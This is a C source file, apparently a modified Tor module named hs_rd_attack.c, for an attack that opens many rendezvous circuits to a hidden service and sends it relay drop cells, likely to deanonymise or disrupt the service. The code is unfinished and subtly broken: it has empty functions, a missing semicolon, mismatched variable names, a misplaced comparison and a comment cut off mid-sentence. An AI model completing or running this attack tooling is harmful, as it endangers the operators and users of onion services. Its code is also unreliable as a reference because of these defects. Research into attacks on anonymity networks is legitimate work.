/**
 * \file hs_rd_attack.c
 * \brief contains code to connect to request hidden service and send
 *  relay drop cells to it 
 **/

#include "hs_rd_attack.h"
#include "or.h"
#include "circuituse.h"
#include "rendclient.h"
#include "uti.h"
/* Global variable but not accessible from other files
 * Allow the program to keep a state of the attack 
 *
 * A little bit sexier than extern variables, still messy
 * but ... Ca casse pas trois pattes a un canard :-)
 */

/*NOTE
 *
 * Use control_event to talk with controller
 *
 */
static hs_rd_attack_t *attack_infos = NULL;

hs_attack_stats attack_entry_point(hs_attack_cmd_t cmd, char *onionaddress,
    uint16_t nbr_circuits){
  if (!attack_infos){
    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
  }
  switch(cmd){
    case ESTABLISH_RDV:
      // Establish all rendezvous circuits
      if (init_rendezvous_circuits(nbr_circuits, onionaddress < 0)) {
      }
      if (init_intro_circuit(onionservice) < 0) {
        // something bad happenned, exit
      }
      return attack_infos->stats;
      break;
    case SEND_RD: break;
    default: break;
  }
}

int init_rendezvous_circuits(uint16_t nbr_circuits, char *onionaddress) {

  attack_infos->rendcircs = (origin_circuit_t*) tor_malloc(
        nbr_circuits*sizeof(origin_circuit_t));
  int c = 0;
  for (int i=0; i<nbr_circuits; i++) {
    attack_info->rendcircs[i] = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
        CIRCLAUNCH_IS_INTERNAL);
    attack_infos->rendcircs[i]->rend_data =
      rend_data_client_create(onionaddress, NULL, NULL, REND_NO_AUTH);

    // this is already done by circuit_has_oppened()
    /*if(rend_client_send_establish_rendezvous(attack_infos->rendcircs[i]) < 0){*/
      //need to do something about that
      /*log_warn(LD_GENERAL, "Could not establish rendezvous on circuit %u", i);*/
      /*c++;*/
    /*}*/
  }
  return 0;
}

/*
 * Create a circuit towards the introduction point and send
 * nbr_circuits different INTRO1 cells
 */

int init_intro_circuit(){
  attack_infos->circ_to_intro = (origin_circuit_t *) tor_malloc(
      sizeof(struct origin_circuit_t));
  attack_infos->circ_to_intro = circuit_launch(CIRCUIT_PURPOSE_C_INTRODUCING,
       CIRCLAUNCH_IS_INTERNAL)

  return 0;
}

/*
 * Almost a copy of 
 *
 * Create a valid relay drop cell for session with circuit circ and sent it through circ
 *
 * If the cell cannot be sent, we mark the circuit for close and return -1
 */

int send_rd_cell(circuit_t *circ){


}

void free_hs_rd_attack(){

}

